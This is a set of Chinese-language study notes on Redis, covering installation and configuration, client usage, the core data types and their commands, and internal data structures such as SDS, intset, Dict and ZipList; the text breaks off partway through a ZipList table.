# 概述

## NoSQL

NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称[^2]。包括键值类型（例如Redis）、文档类型（例如MongoDB）、列类型（例如HBase）与图类型（例如Neo4j）的数据库等。

NoSQL与SQL的区别如下：

|          | SQL                                                          | NoSQL                                                        |
| -------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 数据结构 | **结构化（Structured）**，即数据有固定的格式要求，通过表与表的约束定义，且表的结构不建议随便修改。 | **非结构化**，数据结构没有非常严格的约束。                   |
| 数据关联 | 数据与数据之间往往是**关联的（Relational）**，例如订单表通过外键关联用户表与商品表，它的一个好处是可以节省存储空间，例如订单表只需要存储外键，而不需要存储用户与商品的全部信息。 | 数据与数据没有直接维护关联（**无关联的**），常见的方式是通过JSON定义关联，例如JSON记录了用户信息，并且其`orders`属性记录用户订单信息，它是一个数组，这会导致数据存储重复。也可以单独建立一个商品JSON，并通过其`id`引用，以消除冗余。但是这种关系需要程序员自己通过业务逻辑维护。 |
| 查询方式 | 使用**SQL查询**，语法固定，通用性强。                        | **非SQL**，没有固定的语法格式，标准不统一。优点是风格简单、易于学习。 |
| 事务特性 | 支持事务，即**ACID**特性。                                   | 要么不支持事务，要么无法满足事务的强一致性，只能保证基本一致性。即无法满足或全部满足ACID，只满足**BASE**。 |
| 存储方式 | 多数采用**磁盘**存储（虽然有缓存，但是核心数据在磁盘）。     | 多数采用**内存**存储，性能高。                               |
| 扩展性   | **垂直**方式，数据存储在本机，没有充分考虑数据分片需求。虽然MySQL支持主从，但是它只能提升机器数量、读写性能，不能提升数据存储总量（只是备份）。MySQL可以基于第三方组件实现数据库分库，但是这会影响性能，且开发的复杂度增加。 | **水平**方式，设计之初考虑到数据拆分需求。插入数据时往往会基于数据的唯一标识作哈希运算，并根据其结果判断数据应存在哪个结点上。 |
| 使用场景 | 数据结构固定；相关业务对数据安全性、一致性要求较高。         | 数据结构不固定；对一致性、安全性要求不高；对性能要求高。     |

## Redis

[Redis](https://redis.io/)诞生于2009年，全称是**Re**mote **Di**ctionary **S**erver（远程词典服务器），是一个基于内存的键值型NoSQL数据库，使用C语言实现。

Redis的特征如下：

- 键值（key-value）型，值支持多种不同数据结构，功能丰富。
- 单线程（执行命令时），每个命令具备原子性。
- 低延迟，速度快，因为它基于内存（最主要的原因）、基于IO多路复用、有良好的编码。
- 支持数据持久化。
- 支持主从集群、分片集群。
- 支持多语言客户端。

# Redis安装

下面在CentOS 7中[安装Redis](https://redis.io/download/)，这里安装的是[Redis 6.2.7](https://download.redis.io/releases/redis-6.2.7.tar.gz)。

Redis是基于C语言编写的，因此首先需要安装Redis所需要的gcc依赖：

```sh
yum install -y gcc tcl
```

将Redis安装包上传到虚拟机（这里上传到/usr/local/src目录）并解压缩：

```sh
tar -xzf redis-6.2.7.tar.gz
```

进入解压的Redis目录，运行编译命令：

```sh
make && make install
```

默认的安装路径在`/usr/local/bin`目录下。

该目录已经默认配置到环境变量，因此可以在任意目录下运行这些命令。其中：

- `redis-cli`：Redis提供的命令行客户端。
- `redis-server`：Redis的服务端启动脚本。
- `redis-sentinel`：Redis的哨兵启动脚本。

## Redis启动

Redis的启动方式有多种，例如默认启动、指定配置启动以及开机自启。

### 默认启动

安装完成后，在任意目录输入`redis-server`命令即可（默认）启动Redis。这种启动属于前台启动，会阻塞整个会话窗口，窗口关闭或者按下`CTRL + C`则Redis停止。不推荐使用。

### 指定配置启动

如果要让Redis以后台方式启动，则必须修改Redis配置文件，它在之前解压的Redis目录下，名为redis.conf。

先将配置文件备份：

```sh
cp redis.conf redis.conf.bak
```

修改其中一些配置：

```sh
# 端口监听地址，默认是127.0.0.1，会导致只能在本地访问；修改为0.0.0.0则可以在任意IP访问，生产环境不要设置为0.0.0.0
bind 0.0.0.0
# 守护进程，修改为yes后即可后台运行
daemonize yes 
# 密码，设置后访问Redis必须输入密码
requirepass 123456
```

Redis的其他常见配置如下：

```sh
# 监听的端口
port 6379
# 工作目录，默认是当前目录，也就是运行redis-server命令时所在的目录，日志、持久化等文件会保存在这个目录
dir .
# 数据库数量，设置为1，代表只使用1个库，默认有16个库，编号0~15
# 通过配置文件可以设置仓库数量，但是不能超过16，并且不能自定义仓库名称
databases 1
# 设置redis能够使用的最大内存
maxmemory 512mb
# 日志文件，默认为空，不记录日志，可以指定日志文件名
logfile "redis.log"
```

进入解压的Redis目录，启动Redis：

```sh
redis-server redis.conf
```

查看Redis是否成功启动：

```sh
ps -ef | grep redis
```

### 开启自启

可以通过配置来实现开机自启。

新建一个系统服务文件：

```sh
vi /etc/systemd/system/redis.service
```

内容如下：

```
[Unit]
Description=redis-server
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/bin/redis-server /usr/local/src/redis-6.2.7/redis.conf
PrivateTmp=true

[Install]
WantedBy=multi-user.target
```

重载系统服务：

```sh
systemctl daemon-reload
```

现在，可以用下面这组命令来操作Redis了：

```sh
# 启动
systemctl start redis
# 停止
systemctl stop redis
# 重启
systemctl restart redis
# 查看状态
systemctl status redis
```

执行下面的命令，可以让Redis开机自启：

```sh
systemctl enable redis
```

## 停止服务

可以使用`kill -9 [进程号] `命令停止Redis进程，这会强制结束程序。强行终止Redis进程可能会导致Redis持久化丢失。

利用`redis-cli`来执行`shutdown`命令（向Redis发送`shutdown`命令），即可停止Redis服务。如果之前配置了密码，则需要通过`-u`来指定密码：

```sh
redis-cli -u 123456 shutdown
```

## Redis客户端

安装完成Redis，就可以操作Redis，实现数据的CRUD了。这需要用到Redis客户端，包括：

- 命令行客户端
- 图形化桌面客户端
- 编程客户端

### Redis命令行客户端

Redis安装完成后就自带了命令行客户端：`redis-cli`，使用方式如下：

```sh
redis-cli [options] [commonds]
```

其中常见的`options`有：

- `-h 127.0.0.1`：指定要连接的Redis节点的IP地址，默认是127.0.0.1。
- `-p 6379`：指定要连接的Redis节点的端口，默认是6379。
- `-a 123456`：指定Redis的访问密码。也可以不指定`-a`，而是在进入`redis-cli`的交互控制台后，通过`AUTH`命令指定用户名与密码：`AUTH 123456`（这里未指定用户名）。

其中的`commonds`就是Redis的操作命令，例如：

- `ping`：与Redis服务端做心跳测试，服务端正常会返回`PONG`

不指定`commonds`时，会进入`redis-cli`的交互控制台。

如果是基于`redis-cli`连接Redis服务，可以通过`select`命令来选择数据库：

```sh
# 选择0号库
select 0
```

### 图形化界面客户端

[RedisDesktopManager](https://github.com/uglide/RedisDesktopManager)是一个Redis的图形化桌面客户端。不过该仓库提供的是RedisDesktopManager的源码，并未提供windows安装包。在下面这个仓库可以找到相关的安装包：https://github.com/lework/RedisDesktopManager-Windows/releases。

# Redis数据类型

Redis是一个键值型数据库，键一般是`String`类型，不过值的类型多种多样：

| 类型        | 举例                       |
| ----------- | -------------------------- |
| `String`    | `hello world`              |
| `Hash`      | `{name : "Jack", age: 21}` |
| `List`      | `[A -> B -> C -> C]`       |
| `Set`       | `{A, B, C}`                |
| `SortedSet` | `{A: 1, B: 2, C: 3}`       |
| `GEO`       | `{A: (120.3, 30.5)}`       |
| `BitMap`    | `0110110101110101011`      |
| `HyperLog`  | `0110110101110101011`      |

其中前五种类型为基本类型，后三种类型是在基本类型的基础上做了特殊处理、用来实现特殊功能，因此被称为特殊类型。

Redis为了方便我们学习，将操作不同数据类型的命令也做了分组，在官网（ [https://redis.io/commands ](https://redis.io/commands)）可以查看到不同的命令。也可以通过命令行查看命令（`help @[组]`）：

```sh
help @generic  # 查看通用命令
help @string  # 查看string类型
```

通过`help [command]`可以查看一个命令的具体用法，例如：

```sh
help keys
```

## Redis通用命令

通用命令是适用于任何数据类型的命令，常见的有：

| 命令     | 描述                                                         |
| -------- | ------------------------------------------------------------ |
| `KEYS`   | 查看符合模板的所有键，由于可能使用模糊查询，因此效率不高，不建议在生产环境设备上使用（且由于Redis是单线程的，所以最好在从节点上执行该命令） |
| `DEL`    | 删除一个指定的键，返回值为删除的数量                         |
| `EXISTS` | 判断键是否存在，当键不存在则返回0，否则返回1                 |
| `EXPIRE` | 给一个键设置有效期（秒），有效期到期时该键会被自动删除；     |
| `TTL`    | 查看一个键的剩余有效期（秒），默认为-1，表示永久有效；如果键的有效期为-2，则表示该键失效 |

## `String`类型

`String`类型，也就是字符串类型，是Redis中最简单的存储类型。其值是字符串，不过根据字符串的格式不同，又可以分为3类：

- `string`：普通字符串。

- `int`：整数类型，可以做自增、自减操作。

- `float`：浮点类型，可以做自增、自减操作。

不管是哪种格式，底层都是字节数组形式存储，只不过是编码方式不同（数值类型采用二进制编码，因此节省空间）。字符串类型的最大空间为512M。

`String`的常见命令有：

| 命令          | 描述                                                         |
| ------------- | ------------------------------------------------------------ |
| `SET`         | 添加或者修改一个`String`类型的键值对                         |
| `GET`         | 根据键获取`String`类型的值                                   |
| `MSET`        | 批量添加多个`String`类型的键值对                             |
| `MGET`        | 根据多个键获取多个String类型的值，返回值是数组               |
| `INCR`        | 让一个整型键的值自增1                                        |
| `INCRBY`      | 让一个整型的键的值自增指定步长（可以为负，当然也可以使用`DECR`） |
| `INCRBYFLOAT` | 让一个浮点型的键的值自增指定步长                             |
| `SEINX`       | 添加一个`String`类型的键值对，前提是键不存在，否则不执行，等价于`SET`加上`NX`参数 |
| `SETEX`       | 添加或修改一个`String`类型的键值对，并且指定有效期，等价于`SET`加上`EX`参数 |

### 数据结构

- `String`的基本编码方式是`RAW`，基于简单动态字符串（SDS）实现，存储上限为512MB。
- 如果存储的SDS长度小于44字节，则会采用`EMBSTR`编码，此时object head与SDS是一段连续空间（即`RedisObject`后紧跟SDS）。申请内存时只需要调用一次内存分配函数，效率更高。这样这段连续空间最大为64字节（object head为16字节，SDS需要额外的4字节，加上SDS长度44个字节），因为Redis底层采用的内存分配算法为JeMalloc，它会以2的整数幂为单位进行内存分配。
- 如果存储的字符串是整数值，并且大小在`LONG_MAX`范围内，则会采用`INT`编码：直接将数据保存在`RedisObject`的`ptr`指针位置（刚好8字节），不再需要SDS了。

[^0]: 应该是小于等于44字节。

## 键的结构

有时需要区分不同类型的键。例如，需要存储用户、商品信息到Redis，有一个用户的`id`是1，有一个商品的`id`恰好也是1。

Redis没有类似MySQL中的表的概念，它的解决方案是：Redis的键允许有多个单词形成层级结构，多个单词之间用`:`隔开，格式为：`[项目名]:[业务名]:[类型]:[id]`。这个格式并非固定，可以根据自己的需求来删除或添加词条。从图形化界面客户端可以看到这种层级结构。

例如项目名称为`example`，有`user`和`product`两种不同类型的数据，我们可以这样定义键：

- `user`相关的键：`example:user:1`。
- `product`相关的键：`example:product:1`。

如果值是一个Java对象，例如一个`User`对象，则可以将对象序列化为JSON字符串后存储：

```sh
SET example:user:1 '{"id":1, "name":"Jack", "age": 21}'
SET example:user:2 '{"id":2, "name":"Rose", "age": 18}'
SET example:product:1 '{"id":1, "name":"小米11", "price": 4999}'
SET example:product:2 '{"id":2, "name":"荣耀6", "price": 2999}'
```

## `Hash`类型

`Hash`类型，也叫散列，其值是一个无序字典（其键值分别记为`field`与`value`），类似于Java中的`HashMap`结构。

`String`结构是将对象序列化为JSON字符串后存储，当需要修改对象某个字段时很不方便。`Hash`结构可以将对象中的每个字段独立存储，可以针对单个字段做CRUD。

`Hash`的常见命令有：

| 命令      | 描述                                                         |
| --------- | ------------------------------------------------------------ |
| `HSET`    | 添加或者修改`Hash`类型`key`的`field`的值                     |
| `HGET`    | 获取一个`Hash`类型`key`的`field`的值                         |
| `HMSET`   | 批量添加多个`Hash`类型`key`的`field`的值（`HSET`也能做到）   |
| `HMGET`   | 批量获取多个`Hash`类型`key`的`field`的值                     |
| `HGETALL` | 获取一个`Hash`类型的`key`中的所有的`field`和`value`，注意键值依次返回的，如果有10个键值对，则返回20个结果 |
| `HKEYS`   | 获取一个`Hash`类型的`key`中的所有的`field`                   |
| `HVALS`   | 获取一个`Hash`类型的`key`中的所有的`value`                   |
| `HINCRBY` | 让一个`Hash`类型`key`的`field`的值自增并指定步长             |
| `HSETNX`  | 添加一个`Hash`类型的`key`的`field`的值，前提是这个`field`不存在，否则不执行 |

下面使用`Hash`存储`user`和`product`：

```sh
HMSET example:user:1 id 1 name Jack age 21
HMSET example:user:2 id 2 name Rose age 18
HMSET example:product:1 id 1, name 小米11 price 4999
HMSET example:product:2 id 2, name 荣耀6 price 2999
```

### 数据结构

`Hash`结构与Redis中的`ZSet`非常类似：

- 都是键值存储。
- 都需求根据键获取值。
- 键必须唯一。

区别如下：

- `ZSet`的键是`member`，值是`score`；`Hash`的键和值都是任意值。
- `ZSet`要根据`score`排序；`Hash`则无需排序。

因此，`Hash`底层采用的编码与`ZSet`也基本一致，只需要把排序有关的`SkipList`去掉即可：

- `Hash`结构默认采用`ZipList`编码，用以节省内存。 `ZipList`中相邻的两个`entry`分别保存`field`和`value`。如果待插入元素的键不存在，则创建一个新的、默认采用`ZipList`编码的`Hash`。
- 当数据量较大时，`Hash`结构会转为HT编码，也就是`Dict`，触发条件有两个（当然，如果本来就不是`ZipList`或待添加的键已存在则无需转换）：
  - `ZipList`中的元素数量超过了`hash-max-ziplist-entries`（默认512）（每次插入一个元素后执行，因为执行插入操作前无法判断这一条件是否成立）。
  - `ZipList`中的任意`entry`的`field`或`value`大小超过了`hash-max-ziplist-value`（默认64字节），或`ZipList`当前大小加上待插入元素的总大小超过1G（所有元素插入前执行）。

这两个值可以通过`config get`命令获取，通过`config set `命令或配置文件设置。

## `List`类型

Redis中的`List`类型与Java中的`LinkedList`类似，可以看做是一个双向链表结构。既支持正向检索和也支持反向检索。它的特征也与`LinkedList`类似：

- 有序。

- 元素可以重复。

- 插入和删除快。

- 查询速度一般。

常用来存储有序数据，例如：朋友圈点赞列表，评论列表等。

`List`的常见命令有：

| 命令             | 描述                                                         |
| ---------------- | ------------------------------------------------------------ |
| `LPUSH`          | 向列表左侧插入一个或多个元素（注意，如果一次性插入多个元素，则元素是逆向的，因为元素是按序插入的，下同） |
| `LPOP`           | 移除并返回列表左侧第一个元素，没有则返回`nil`                |
| `RPUSH`          | 向列表右侧插入一个或多个元素                                 |
| `RPOP`           | 移除并返回列表右侧第一个元素,没有则返回`nil`                 |
| `LRANGE`         | 返回一段角标范围内的所有元素（下标从0开始，左闭右闭）        |
| `BLPOP`、`BRPOP` | 与`LPOP`和`RPOP`类似，只不过在没有元素时等待指定时间，而不是直接返回`nil`（如果成功获取到元素，则返回键与元素，并显示花费时间） |

使用`LPUSH`与`LPOP`（或`RPUSH`与`RPOP`）可以模拟一个栈，使用`LPUSH`与`RPOP`（或`RPUSH`与`LPOP`）可以模拟一个队列，使用`LPUSH`与`BRPOP`（或`RPUSH`与`BLPOP`）可以模拟一个阻塞队列。

### 数据结构

Redis的`List`类型可以从首、尾操作列表中的元素，能满足该特征的数据结构包括：

- `LinkedList`：普通链表，可以从双端访问，内存占用较高，内存碎片较多。
- `ZipList`：压缩列表，可以从双端访问，内存占用低，存储上限低。
- `QuickList`：`LinkedList` + `ZipList`，可以从双端访问，内存占用较低，包含多个`ZipList`，存储上限高。

在3.2版本之前，Redis采用`ZipList`和`LinkedList`来实现`List`，当元素数量小于512并且元素大小小于64字节（可以设置）时采用`ZipList`编码，超过则采用`LinkedList`编码。在3.2版本之后，Redis统一采用`QuickList`来实现`List`。

## `Set`类型

Redis的`Set`结构与Java中的`HashSet`类似，可以看做是一个值为`null`的`HashMap`。因为也是一个哈希表，因此具备与`HashSet`类似的特征：

- 无序。
- 元素不可重复（保证元素唯一且可以（高效地）判断元素是否存在）。
- 查找快。
- 能够对元素（高效地）求交集、并集、差集。

`Set`的常见命令有：

| 命令        | 描述                          |
| ----------- | ----------------------------- |
| `SADD`      | 向`Set`中添加一个或多个元素   |
| `SREM`      | 移除`Set`中的指定元素         |
| `SCARD`     | 返回`Set`中元素的个数         |
| `SISMEMBER` | 判断一个元素是否存在于`Set`中 |
| `SMEMBERS`  | 获取`Set`中的所有元素         |
| `SINTER`    | 求两个`Set`的交集             |
| `SDIFF`     | 求两个`Set`的差集             |
| `SUNION`    | 求两个`Set`的并集             |

将下列数据用Redis的Set集合来存储：

- 张三的好友有：李四、王五、赵六。

- 李四的好友有：王五、麻子、二狗。

  ```sh
  SADD 张三 李四 王五 赵六
  SADD 李四 王五 麻子 二狗
  ```

并利用`Set`的命令实现下列功能：

- 计算张三的好友有几人：

  ```sh
  SCARD 张三
  ```

- 计算张三和李四有哪些共同好友：

  ```sh
  SINTER 张三 李四
  ```

- 查询哪些人是张三的好友却不是李四的好友：

  ```sh
  SDIFF 张三 李四
  ```

- 查询张三和李四的好友总共有哪些人：

  ```sh
  SUNION 张三 李四
  ```

- 判断李四是否是张三的好友：

  ```sh
  SISMEMBER 张三 李四
  ```

- 判断张三是否是李四的好友：

  ```sh
  SISMEMBER 李四 张三
  ```

- 将李四从张三的好友列表中移除：

  ```sh
  SREM 张三 李四
  ```

### 数据结构

`Set`对查询元素的效率要求非常高，能够满足的数据结构是`HashTable`，也就是Redis中的`Dict`，不过`Dict`是双列集合（可以存键、值对）（`SkipList`要求指定数值进行排序，因此不合适）。

- 为了查询效率和唯一性，`Set`采用HT编码（`Dict`）。`Dict`中的键用来存储元素，值统一为`null`。
- 当存储的所有数据都是整数，并且元素数量不超过`set-max-intset-entries`（可以通过`config get`命令获取，通过`config set `命令或配置文件设置）时，`Set`会采用`IntSet`编码，以节省内存。在给`Set`插入元素时，如果元素不是整数，或者插入导致元素数量超过`set-max-intset-entries`，且当前当前编码方式为`IntSet`，则`Set`将编码方式转为HT。

## `SortedSet`类型

Redis的`SortedSet`是一个可排序的`Set`集合，与Java中的`TreeSet`有些类似，但底层数据结构差别很大。`SortedSet`中的每一个元素都带有一个`score`属性，可以基于`score`属性对元素排序，底层的实现是一个跳表（`SkipList`）加哈希表。

`SortedSet`具备下列特性：

- 可以根据`score`值排序。

- 元素（`member`属性）不重复。

- 查询速度快；可以（高效地）根据`member`查询分数。

因为`SortedSet`的可排序特性，经常被用来实现排行榜这样的功能。

`SortedSet`的常见命令有：

| 命令            | 描述                                                         |
| --------------- | ------------------------------------------------------------ |
| `ZADD`          | 添加一个或多个元素到`SortedSet`，如果已经存在则更新其`score`值 |
| `ZREM`          | 删除`SortedSet`中的一个指定元素                              |
| `ZSCORE`        | 获取`SortedSet`中的指定元素的`score`值                       |
| `ZRANK`         | 获取`SortedSet`中的指定元素的排名（从0开始）                 |
| `ZCARD`         | 获取`SortedSet`中的元素个数                                  |
| `ZCOUNT`        | 统计`score`值在给定范围内的所有元素的个数                    |
| `ZINCRBY`       | 让`SortedSet`中的指定元素自增，步长为指定的值                |
| `ZRANGE`        | 按照`score`排序后，获取指定排名范围内的元素                  |
| `ZRANGEBYSCORE` | 按照`score`排序后，获取指定`score`范围内的元素               |
| `ZDIFF`         | 求差集、交集、并集                                           |

注意：所有的排名默认都是升序，如果要降序则在命令的`Z`后面添加`REV`即可。

下面将班级的下列学生得分存入Redis的`SortedSet`中：Jack 85、Lucy 89、Rose 82、Tom 95、Jerry 78、Amy 92、Miles 76：

```sh
ZADD stus 85 Jack 89 Lucy 82 Rose 95 Tom 78 Jerry 92 Amy 76 Miles 
```

并实现下列功能：

- 删除Tom同学：

  ```sh
  ZREM stus Tom
  ```

- 获取Amy同学的分数：

  ```sh
  ZSCORE stus Amy
  ```

- 获取Rose同学的排名：

  ```sh
  ZREVRANK stus Rose
  ```

- 查询80分及以下有几个学生：

  ```sh
  ZCOUNT stus 0 80
  ```

- 给Amy同学加2分：

  ```sh
  ZINCRBY stus 2 Amy
  ```

- 查出成绩前3名的同学：

  ```sh
  ZREVRANGE stus 0 2
  ```

- 查出成绩80分以下的所有同学：

  ```sh
  ZRANGEBYSCORE stus 0 80
  ```

### 数据结构

`ZSet`底层数据结构必须满足键值存储、键必须唯一、可排序等需求。`SkipList`可以排序，并且可以同时存储`score`和`ele`值（member）；HT（`Dict`）可以键值存储，并且可以根据键快速找值。`ZSet`同时使用这两种数据结构：

```c
// zset结构
typedef struct zset {
    dict *dict;  // Dict指针
    zskiplist *zsl;  // SkipList指针
} zset;
```

当创建`ZSet`时，Redis会同时创建一个`Dict`与`SkipList`，并指定编码为`OBJ_ENCODING_SKIPLIST`（因为只能指定一种编码）。

当元素数量不多时，HT和`SkipList`的优势不明显，而且更耗内存。因此`ZSet`还会采用`ZipList`结构来节省内存，不过需要同时满足两个条件：

- 元素数量小于`zset_max_ziplist_entries`，默认值128。
- 每个元素都小于`zset_max_ziplist_value`字节，默认值64。

这两个值可以通过`config get`命令获取，通过`config set `命令或配置文件设置。

当向`ZSet`中添加元素时（包括在创建`Zset`时添加元素），如果插入导致不满足这两个条件，则`ZSet`使用（或将`ZipList`转为）`SkipList`+`Dict`。显然，如果`Zset`已经是`SkipList`+`Dict`编码，或者待添加的元素已存在（只需更新`score`），则无需更新编码。

`ZipList`本身没有排序功能，而且没有键值对的概念，因此需要有`ZSet`通过编码实现：

- `ZipList`是连续内存，因此`score`和`element`是紧挨在一起的两个`entry`， `element`在前，`score`在后。
- `score`越小越接近队首，`score`越大越接近队尾，按照`score`值升序排列。

# Redis数据结构

## 动态字符串SDS

Redis中保存的键是字符串，值往往是字符串或者字符串的集合。可见字符串是Redis中最常用的一种数据结构。

不过Redis没有直接使用C语言中的字符串，因为C语言字符串存在很多问题：

- 获取字符串长度的需要通过运算。
- 非二进制安全（例如字符串中间不允许包含`\0`字符）。
- 不可修改。

Redis构建了一种新的字符串结构，称为**简单动态字符串（Simple Dynamic String，SDS）**，相关操作在sds.h与sds.c中。

例如，执行命令`set name Alice`，那么Redis将在底层创建两个SDS，其中一个是包含`name`的SDS，另一个是包含`Alice`的SDS。

SDS是一个结构体，定义如下：

```c
struct __attribute__ ((__packed__)) sdshdr8 {
    uint8_t len;  // buf已保存的字符串字节数，不包含结束标识
    uint8_t alloc;  // buf申请的总的字节数，不包含结束标识
    unsigned char flags;  // 不同SDS的头类型，用来控制SDS的头大小
    char buf[];  // 为了兼容C，它也会包含结束标识
};
```

其中前三个属性为头（header），第四个属性为数据。Redis还定义了`sdshdr16`、`sdshdr32`与`sdshdr64`等SDS（还包含一个从未被使用的`sdshdr5`）。

SDS之所以叫做动态字符串，是因为它具备动态扩容的能力。如果要给SDS追加一段字符串，则首先会申请新内存空间：

- 如果新字符串小于1M，则新空间为扩展后字符串长度的两倍$+1$（$1$对应结束标识）。
- 如果新字符串大于1M，则新空间为扩展后字符串长度$+1M+1$。

这被称为**内存预分配**。

例如，一个内容为`hi`的SDS，`len=2`、`alloc=2`、`flags=1`，`buf="hi\0"`。如果要给它追加一段字符串`,Amy`，则可能`len=6`、`alloc=12`、`flags=1`，`buf=hi,Amy\0`，最后还有6个空闲字节。

SDS的优势在于：

- 获取字符串长度的时间复杂度为$O(1)$。
- 支持动态扩容。
- 减少内存分配次数。
- 二进制安全。

## `intset`

`intset`是Redis中`set`集合的一种实现方式，基于整数数组来实现，长度可变，元素唯一且有序，相关操作在intset.h与intset.c中。`intset`的结构如下：

```c
typedef struct intset {
    uint32_t encoding;  // 编码方式，支持存放16位、32位、64位整数
    uint32_t length;  // 元素个数
    int8_t contents[];  // 整数数组，保存集合数据
} intset;
```

同理，前两个属性为头。

`encoding`包含三种模式，表示存储的整数大小不同：

```c
/* Note that these encodings are ordered, so:
 * INTSET_ENC_INT16 < INTSET_ENC_INT32 < INTSET_ENC_INT64. */
#define INTSET_ENC_INT16 (sizeof(int16_t))  // 2字节整数，范围类似java的short
#define INTSET_ENC_INT32 (sizeof(int32_t))  // 4字节整数，范围类似java的int
#define INTSET_ENC_INT64 (sizeof(int64_t))  // 8字节整数，范围类似java的long
```

为了方便查找，Redis会将`intset`中所有的整数按照升序依次保存在`contents`数组中。在插入元素时，会基于二分查找判断元素是否存在。如果存在，则直接返回；否则将元素插入合适位置。

### `intset`升级

如果要存储的数值超过当前`encoding`所能存储的数值范围（上溢或下溢），`intset`会自动升级编码方式到合适的大小。Redis首先判断待插入元素的编码是否超出了当前`intset`的编码，如果超过，则执行下列操作：

- 获取当前`intset`的编码与新编码。
- 判断新元素大于0还是小于0，如果小于0将插入队首，否则插入队尾。
- 升级`intset`编码为新编码，并按照新的编码方式及元素个数扩容`intset`。

- 倒序依次将`intset`中的元素拷贝到扩容后的正确位置。
- 将待添加的元素放入`intset`头或尾。
- 修改`intset`长度（即`length`属性）。

否则执行下列操作：

- 在当前`intset`中查找值与该数字一样的元素的下标`pos`。
- 如果找到，则无需插入，直接结束并返回失败。
- 否则，`intset`扩容。`pos`指向待插入的位置，因此移动`intset`中`pos`之后的元素到`pos+1`，给新元素腾出空间。
- 插入新元素，并修改`intset`长度。

通过这种机制，`intset`可以节省内存空间。

## `Dict`

Redis是一个键值型（Key-Value Pair）的数据库，可以根据键实现快速的增删改查。而键与值的映射关系正是通过`Dict`来实现的，相关操作在dict.h与dict.c中。

`Dict`由三部分组成，分别是：哈希表（`DictHashTable`）、哈希节点（`DictEntry`）、字典（`Dict`），定义如下：

```c
typedef struct dict {
    dictType *type;  // dict类型，内置不同的哈希函数
    void *privdata;  // 私有数据，在做特殊哈希运算时用
    dictht ht[2];  // 一个Dict包含两个哈希表，其中一个是当前数据，另一个一般是空，rehash时使用
    long rehashidx;  // rehash的进度，-1表示未进行
    int16_t pauserehash;  // rehash是否暂停，1则暂停，0则继续
} dict;
```

```c
typedef struct dictht {
    dictEntry **table;  // entry数组，数组中保存的是指向entry的指针
    unsigned long size;  // 哈希表大小（2的整数幂）  
    unsigned long sizemask;  // 哈希表大小的掩码，总等于size - 1 
    unsigned long used;  // entry个数
} dictht;
```

```c
typedef struct dictEntry {
    void *key; // 键
    union {
        void *val;
        uint64_t u64;
        int64_t s64;
        double d;
    } v; // 值
    struct dictEntry *next;  // 下一个Entry的指针
} dictEntry;
```

当向`Dict`添加键值对时，Redis首先根据键计算出哈希值（`h`），然后利用`h & sizemask`来计算元素应该存储到数组中的哪个索引位置。元素总是被插入到该位置的队首。

### `Dict`的扩容

`Dict`中的`HashTable`就是数组结合单向链表的实现，当集合中元素较多时，必然导致哈希冲突增多，链表过长，则查询效率会大大降低。

`Dict`在每次新增键值对时都会检查**负载因子**（`LoadFactor = used / size`） ，满足以下两种情况时会触发**哈希表扩容**：

- 哈希表的`LoadFactor >= 1`，并且服务器没有执行`BGSAVE`或者 `BGREWRITEAOF`等后台进程（这些后台进程对CPU使用率高，且有大量IO读写，此时进行扩容操作可能造成它们堵塞，造成主进程堵塞）。
- 哈希表的`LoadFactor > 5`。

扩容大小为`used + 1`，底层会对扩容大小做判断，实际上找的是第一个大于等于`used + 1`的2的整数幂。

### `Dict`的收缩

`Dict`除了扩容以外，每次成功删除元素后，也会对负载因子做检查，当`LoadFactor < 0.1`且`size > 4`时，会收缩`Dict`。如果当前在执行`BGSAVE`、 `BGREWRITEAOF`或rehash等，则返回错误；否则如果当前元素个数（`used`）小于4，则重置哈希表大小为4；否则重置哈希表大小为第一个大于等于当前`used`的2的整数幂。

[^0]: 扩容与收缩的`used`到底指执行前还是执行后的结果？

### `Dict`的rehash

不管是扩容还是收缩，必定会创建新的哈希表，导致哈希表的`size`和`sizemask`变化，而键的查询与`sizemask`有关。因此必须对哈希表中的每一个键重新计算索引，插入新的哈希表，这个过程称为**rehash**。过程是这样的：

- 计算新哈希表的`realeSize`，值取决于当前要做的是扩容还是收缩：
  - 如果是扩容，则新`size`为第一个大于等于`dict.ht[0].used + 1`的2的整数幂。
  - 如果是收缩，则新`size`为第一个大于等于`dict.ht[0].used`的2的整数幂（如果小于4，则置为4）。
- 按照新的`realeSize`申请内存空间，创建`dictht`，并赋值给`dict.ht[1]`
- 设置`dict.rehashidx = 0`，表示开始`rehash`。
- 将`dict.ht[0]`中的每一个`dictEntry`都`rehash`到`dict.ht[1]`。
- 将`dict.ht[1]`赋值给`dict.ht[0]`，给`dict.ht[1]`初始化为空哈希表，释放原来的`dict.ht[0]`的内存。

`Dict`的rehash并不是一次性完成的。试想一下，如果`Dict`中包含数百万的entry，要在一次rehash完成，极有可能导致主线程阻塞。因此`Dict`的rehash是分多次、渐进式的完成，称为**渐进式rehash**。流程如下：

- 计算新哈希表的`size`，值取决于当前要做的是扩容还是收缩：
  - 如果是扩容，则新`size`为第一个大于等于`dict.ht[0].used + 1`的2的整数幂。
  - 如果是收缩，则新`size`为第一个大于等于`dict.ht[0].used`的2的整数幂（如果小于4，则置为4）。
- 按照新的`size`申请内存空间，创建`dictht`，并赋值给`dict.ht[1]`。
- 设置`dict.rehashidx = 0`，表示开始`rehash`。
- 每次执行新增、查询、修改、删除操作时，都检查一下`dict.rehashidx`是否大于-1，如果是则将`dict.ht[0].table[rehashidx]`的`entry`链表rehash到`dict.ht[1]`，并且将`rehashidx++`。直至`dict.ht[0]`的所有数据都rehash到`dict.ht[1]`。
- 将`dict.ht[1]`赋值给`dict.ht[0]`，给`dict.ht[1]`初始化为空哈希表，释放原来的`dict.ht[0]`的内存。
- 将`rehashidx`赋值为-1，代表rehash结束。
- 在rehash过程中，新增操作，则直接写入`ht[1]`，查询、修改和删除则会在`dict.ht[0]`与`dict.ht[1]`中依次查找并执行。这样可以确保`ht[0]`的数据只减不增，随着rehash最终为空。

`Dict`的缺点在于大量使用指针（内存空间分配不连续），造成内存占用空间大，且容易产生内存碎片。

## `ZipList`

`ZipList`是一种特殊的“双端链表” （不是双端链表，但是具备双端列表的许多特性，可以看做一种连续内存空间的“双向链表”），由一系列特殊编码的连续内存块组成，可以在任意一端进行压入/弹出操作, 并且该操作的时间复杂度为$O(1)$。相关操作在ziplist.h与ziplist.c中。

`ZipList`包含以下属性：

| 属性        | 类型       | 长度   | 用途                                                         |
| ----------- | ---------- | ------ | ------------------------------------------------------------ |
